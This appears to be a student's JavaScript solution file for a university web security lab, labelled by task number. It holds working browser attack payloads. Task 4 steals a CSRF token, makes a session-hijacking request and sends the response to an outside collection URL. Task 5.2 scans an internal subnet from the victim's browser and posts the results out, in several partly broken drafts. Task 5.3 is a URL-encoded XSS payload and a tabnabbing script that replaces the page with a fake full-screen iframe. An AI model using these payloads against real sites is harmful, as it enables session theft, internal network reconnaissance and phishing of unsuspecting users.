// task 4
window.gotYou = true;
fetch('https://cs6262.gtisc.gatech.edu/console', {
    method: 'GET',
    headers: {
    'Accept': 'application/json',
    },
    })
.then(function(response) {return response.text()})
.then(function(html) {
var parser = new DOMParser();
var document = parser.parseFromString(html, "text/html");
return document.getElementsByName("csrfmiddlewaretoken")[0].value
})
.then(token => fetch('/session-hijacking/kcable3', {
    method: 'POST',
    headers: {'X-CSRFToken': token},
    }))
.then(function(response) {return response.text()})
.then(function(response) {
    fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: response})
});


// task 5.2
var baseSubnet = '172.16.238.';
var promises = [];
var ips = [];
for (let i = 4; i < 37; i++) {
    let timeout = (i - 4)*1000;
    ipAddr = baseSubnet + i.toString();
    url = 'http://' + ipAddr + ':80';
    promises.push(fetch(url)
    .catch(function(error) {return ""})
    .then(function(response) {
        try {
            toReturn = response.text();
            ips.push(ipAddr);
            return ipAddr
        } catch {
            return response
        }
        }));
}
Promise.all(promises).then(values => fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: values}));



var baseSubnet = '172.16.238.';
var promises = [];
var ips = [];
for (let i = 4; i < 10; i++) {
    let timeout = (i - 4)*1000;
    ipAddr = baseSubnet + i.toString();

    if (ipAddr == '172.16.238.10') {
        continue;
    }

    url = 'http://' + ipAddr + ':80';
    promises.push(new Promise((resolve, reject) => {setTimeout(resolve, timeout)})
    .then(fetch(url))
    .catch(function(error) {return ""})
    .then(function(response) {
        try {
            toReturn = response.text();
            ips.push(ipAddr);
            return "hello"
        } catch {
            return response
        }
        }));
}
Promise.all(promises).then(values => fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: values}));



var baseSubnet = '172.16.238.';
var promises = [];
var ips = [];
for (let i = 4; i < 10; i++) {
    let timeout = (i - 4)*1000;
    ipAddr = baseSubnet + i.toString();

    if (ipAddr == '172.16.238.10') {
        continue;
    }

    url = 'http://' + ipAddr + ':80';
    promises.push(new Promise((resolve, reject) => {setTimeout(resolve, timeout)})
    .then(() => ips.push(timeout)));
}
Promise.all(promises).then(values => fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: ips}));



var baseSubnet = '172.16.238.';
var promises = [];
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 1000);
for (let i = 4; i < 256; i++) {
    ipAddr = 'http://' + baseSubnet + i.toString() + ':80';
    promises.push(fetch(ipAddr, {signal: controller.signal}).then(function(response) {return response.text()}))
}
Promise.all(promises).then(values => fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: values}));



var baseSubnet = '172.16.238.';
var promises = [];
for (let i = 4; i < 256; i++) {
    ipAddr = 'http://' + baseSubnet + i.toString() + ':80';
    promises.push(fetch(ipAddr).then(function(response) {
        if (response.text().includes("hello")) {
            return ipAddr
        }
    }))
}
Promise.all(promises).then(values => fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: values}));




var baseSubnet = '172.16.238.';
var promises = [];
for (let i = 4; i < 256; i++) {
    ipAddr = baseSubnet + i.toString();
    fetch('http://172.16.238.10:80')
    .then(response => {
        if (response.ok) {
            if (response.text().includes("hello")) {
                promises.push(ipAddr)
            }
        }
    })
}
fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: promises})





fetch('http://172.16.238.10:80')
.then(function(response) {return response.text()})
.then(function(response) {
    fetch('https://cs6262.gtisc.gatech.edu/receive/kcable3/707', {method: 'post', body: response})
});



// Task 5.3
{/* <script>
document.body.remove();
let newBody = document.createElement('body');
newBody.style.margin = 0;
newBody.style.overflow = 'hidden';
let iframe = document.createElement('iframe');
iframe.src = 'https://cs6262.gtisc.gatech.edu/tabnabbing/kcable3/';
iframe.className = 'fullscreen';
iframe.style.border = 0;
iframe.style.height = '100vh';
iframe.style.width = '100vw';
newBody.innerHTML = iframe.outerHTML;
document.documentElement.innerHTML = newBody.outerHTML;
</script> */}

// history.replaceState({}, 'Login', '/login');
// window.top.document.title = 'Login';
// anchorTags[i].href = attackUrl;

var attackUrl = 'https://cs6262.gtisc.gatech.edu/search?keyword=%3Cscript%3E+document.body.remove%28%29%3B+let+newBody+%3D+document.createElement%28%27body%27%29%3B+newBody.style.margin+%3D+0%3B+newBody.style.overflow+%3D+%27hidden%27%3B+let+iframe+%3D+document.createElement%28%27iframe%27%29%3B+iframe.src+%3D+%27https%3A%2F%2Fcs6262.gtisc.gatech.edu%2Ftabnabbing%2Fkcable3%2F%27%3B+iframe.className+%3D+%27fullscreen%27%3B+iframe.style.border+%3D+0%3B+iframe.style.height+%3D+%27100vh%27%3B+iframe.style.width+%3D+%27100vw%27%3B+newBody.innerHTML+%3D+iframe.outerHTML%3B+document.documentElement.innerHTML+%3D+newBody.outerHTML%3B+%3C%2Fscript%3E';
let origUrl = document.referrer;
history.replaceState({}, '', origUrl);

<script>
var attackTimeout;
let anchorTags = document.getElementsByTagName('a');
for (var i = 0; i < anchorTags.length; i++) {
    anchorTags[i].target = '_blank';
}

function iframeAttack() {
    document.body.remove();
    let newBody = document.createElement('body');
    newBody.style.margin = 0;
    newBody.style.overflow = 'hidden';
    let iframe = document.createElement('iframe');
    iframe.src = 'https://cs6262.gtisc.gatech.edu/tabnabbing/kcable3/';
    iframe.className = 'fullscreen';
    iframe.style.border = 0;
    iframe.style.height = '100vh';
    iframe.style.width = '100vw';
    newBody.innerHTML = iframe.outerHTML;
    document.documentElement.innerHTML = newBody.outerHTML;
}

function onBlur() {
    console.log("focused on new page.");
    attackTimeout = setTimeout(iframeAttack, 60000);
    console.log("set timer.");
}

function onFocus() {
    console.log("focused on opener page.");
    try {
        clearTimeout(attackTimeout);
        console.log("cleared");
    } catch(error) {
        console.log(error);
    }
}

window.addEventListener('focus', onFocus);
window.addEventListener('blur', onBlur);
</script>


